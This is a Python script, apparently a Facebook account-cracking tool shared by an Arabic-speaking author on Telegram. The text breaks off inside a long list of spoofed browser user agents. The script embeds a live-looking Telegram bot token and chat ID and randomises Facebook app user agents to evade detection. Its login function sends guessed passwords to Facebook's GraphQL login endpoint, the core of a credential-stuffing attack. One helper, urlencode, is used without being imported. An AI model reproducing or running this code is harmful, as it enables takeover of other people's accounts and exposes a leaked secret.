# PYTHON ....
# Telegram : @gg_100k - @zizfif 
# instagram : ****
# Codeder : B7E | ابن بابل 

#ركز 👇 

# هذه الاداة مجانية وليست للبيع الرجاء عدم بيعها ..
# عدم ازالة الحقوق تقديرا لتعبنا وجعلنا نستمر في تقديم مثل هكذا (ادوات او بوتات)..
#ثق بربك ومن خلقك اذه اشوفك تبيع اباده اخليك تحير شلون تحذف حسابك اخمط ونشر لاكن تبيع بي ان،** عرضك صفح
#=========================

import datetime;now = datetime.date.today();target = datetime.date(2028,11,15)
if now >=target:exit(" تم ايقاف الاداة ارسل للمطور ابن بابل لل تفعيل  @zizfif")
from time import sleep
from rich.progress import track
import os
from pyfiglet import Figlet
vip=('V𝗜P                 ')
print("\033[92m"+vip+"" *60)
for stop in track(range(1)):
 sleep(0.30)
 stop
print('   '*10)
W = '\x1b[97;1m'
R = '\x1b[91;1m'
print('\x1b[38;5;208m توكنك حبي')
token = '7830912070:AAGrZITzHkigKtvDAqXO-7caFRYY1mnz3g8'
print(' \x1b[38;5;208m ايديك حبي')
ID = '7676794229'
X = '\033[1;33m'  # اصفر
F = '\033[2;32m'  # اخضر
C = "\033[1;97m"  # ابيض
B = '\033[2;36m'  # سمائي
Y = '\033[1;34m'  # ازرق فاتح
E = '\033[1;31m'  # أحمر
G = '\033[1;32m'  # أخضر فاتح
S = '\033[1;33m'  # اصفر
Z = '\033[1;31m'  # أحمر
a1 = '\x1b[1;31m'  # أحمر
O = '\x1b[38;5;208m'  # برتقالي
R = '\033[0m'  # إعادة ضبط
import os

try:
    import requests
except:
    os.system('pip install requests')

try:
    import concurrent.futures as concurrent
except:
    os.system('pip install futures')
import os
import sys
import time
import requests
import random
import platform
import base64
import subprocess
from concurrent.futures import ThreadPoolExecutor
import requests
import bs4
import uuid
import json
import os
import sys
import random
import datetime
import time
import re
import subprocess

try:
    import rich
except:
    os.system('pip install rich')
time.sleep(1)

try:
    import rich
except:
    exit(' [×] Cant Install Rich Module, Try Manual Install (pip install rich)')
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
import base64
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from urllib.parse import quote

def generate_random_user_agent():
    def random_float(min_value, max_value):
        return round(random.uniform(min_value, max_value), 5)

    def random_int(min_value, max_value):
        return random.randint(min_value, max_value)

    fb_version = f"{random_int(100, 600)}.0.0.{random_int(10, 99)}.{random_int(10, 99)}"
    fb_build_version = random_int(600000000, 999999999)
    density = random_float(1.0, 4.0)
    width = random_int(720, 1440)
    height = random_int(1280, 2560)
    carrier = random.choice(['Telkomsel', 'XL', 'Indosat', 'Smartfren', 'Tri'])
    device_brands = ['google', 'samsung', 'xiaomi', 'oppo', 'vivo']
    device_models = ['Pixel 5', 'Galaxy S21', 'Redmi Note 10', 'A74', 'Y21']
    device_brand = random.choice(device_brands)
    device_model = random.choice(device_models)
    android_version = random_int(7, 12)

    return f"[FBAN/FB4A;FBAV/{fb_version};FBBV/{fb_build_version};FBDM={{density={density},width={width},height={height}}};FBLC/id_ID;FBRV/0;FBCR/{carrier};FBMF/{device_brand};FBBD/{device_brand};FBPN/com.facebook.katana;FBDV/{device_model};FBSV/{android_version};FBOP/1;FBCA/x86_64:arm64-v8a;]"

def send_smartlock_request(user_id, pwx):
    headers = {
        'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
        'x-fb-sim-hni': '51009',
        'x-fb-net-hni': '51009',
        'Content-Type': 'application/x-www-form-urlencoded',
        'x-graphql-client-library': 'graphservice',
        'x-fb-friendly-name': 'FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request',
        'x-tigon-is-retry': 'False',
        'x-fb-privacy-context': '3643298472347298',
        'x-graphql-request-purpose': 'fetch',
        'x-fb-device-group': '5530',
        'User-Agent': generate_random_user_agent(),
        'x-fb-connection-type': 'WIFI',
        'x-fb-rmd': 'fail=Server:NoUrlMap,Default:INVALID_MAP;v=;ip=;tkn=;reqTime=56;recvTime=13823808',
        'x-fb-request-analytics-tags': '{"network_tags":{"product":"350685531728","purpose":"fetch","request_category":"graphql","retry_attempt":"0"},"application_tags":"graphservice"}',
        'Accept-Encoding': 'gzip, deflate',
        'x-fb-http-engine': 'Tigon/Liger',
        'x-fb-client-ip': 'True',
        'x-fb-server-cluster': 'True',
    }

    data = {
        'method': 'post',
        'pretty': 'false',
        'format': 'json',
        'server_timestamps': 'true',
        'locale': 'id_ID',
        'purpose': 'fetch',
        'fb_api_req_friendly_name': 'FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request',
        'fb_api_caller_class': 'graphservice',
        'client_doc_id': '11994080425603935587861051615',
        'variables': json.dumps({
            'params': {
                'params': json.dumps({
                    'server_params': {
                        'family_device_id': str(uuid.uuid4()),
                        'device_id': str(uuid.uuid4()),
                        'machine_id': '',
                        'from_native_screen': True,
                        'contact_point': user_id,
                        'encrypted_password': f"#PWD_FB4A:0:{int(time.time())}:{pwx}"
                    }
                }),
                'bloks_versioning_id': '6a1b3a2ff800611f4dcdecf474aacd60e3165beeab0cf68891c553a6a2862720',
                'app_id': 'com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request'
            },
            'scale': '1.5',
            'nt_context': {
                'using_white_navbar': True,
                'styles_id': '790c12baa860bb932decc340a5291740',
                'pixel_ratio': 1.5,
                'is_push_on': True,
                'debug_tooling_metadata_token': None,
                'is_flipper_enabled': False,
                'theme_params': [],
                'bloks_version': '6a1b3a2ff800611f4dcdecf474aacd60e3165beeab0cf68891c553a6a2862720'
            }
        }),
        'fb_api_analytics_tags': '["GraphServices"]',
        'client_trace_id': str(uuid.uuid4()),
    }

    response = requests.post('https://b-graph.facebook.com/graphql', data=urlencode(data), headers=headers)
    return response.text

ugen2 = [
    'Mozilla/5.0 (Android 2.2; id-id; HTC Desire)/GoBrowser',
    'Mozilla/5.0 (Android 2.2; id-id; HTC Desire)/GoBrowser']
ugen = [
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.3948.40 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3529.87 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.4420.30 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.2854.49 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2518.36 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4363.56 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4521.71 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.3818.58 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4338.13 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3282.20 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.3526.19 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.4170.75 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.3809.88 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.2650.88 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.2560.66 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2652.65 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.4242.37 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2168.82 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4536.44 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.3595.72 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.4647.16 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.3248.66 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4180.49 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2265.27 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.4829.67 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.3605.75 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.3719.20 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4371.95 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.4940.20 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2480.69 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4758.65 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2748.27 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3690.79 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.4228.16 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.2122.70 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.4213.11 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.3452.39 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.3964.28 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.3828.38 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2026.16 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3749.41 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.2762.40 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4792.66 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.2810.13 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.3717.52 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.4249.52 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.4314.41 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2946.77 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.3142.60 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2229.35 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.3597.68 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.3585.69 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4064.19 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.2375.43 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2789.89 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2122.58 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.3070.41 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.3093.24 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.2807.68 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.4643.56 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4945.65 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.4691.44 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4769.79 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4759.55 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.3714.61 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.4883.19 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.4462.88 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.4548.62 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.4134.31 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.4687.51 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.2586.23 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.2797.96 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.4252.37 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3927.47 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.3991.25 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.2505.21 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3900.93 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3769.85 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.2649.53 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.3170.21 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.2653.32 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.4507.52 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.3532.51 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.4865.43 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3367.99 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.3515.35 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2857.50 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2417.72 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.3781.11 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.2160.25 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.2822.65 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.2050.80 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3142.36 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2374.35 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.2380.20 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.3132.72 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3920.48 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.4465.39 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.2251.82 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.4568.47 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.4199.12 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.3420.71 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.4955.44 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3963.46 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.2124.92 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.3081.75 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.2282.73 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.3316.74 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2076.73 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4244.53 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.4516.82 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.2566.13 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.2255.56 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.2451.33 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3241.93 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.4109.30 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.2206.71 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3521.74 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.2337.24 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3351.28 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.3884.36 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.3134.54 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2079.37 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.4115.21 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.4014.60 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.4594.91 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.2875.56 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3473.12 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.2384.48 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4328.46 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.2059.10 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.2960.88 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.3259.92 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.2450.26 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3210.27 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3570.52 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2559.27 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.4808.36 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.2680.94 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.3826.25 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.3921.74 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.4363.72 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.3099.22 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.4233.98 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4605.87 Safari/537.36',
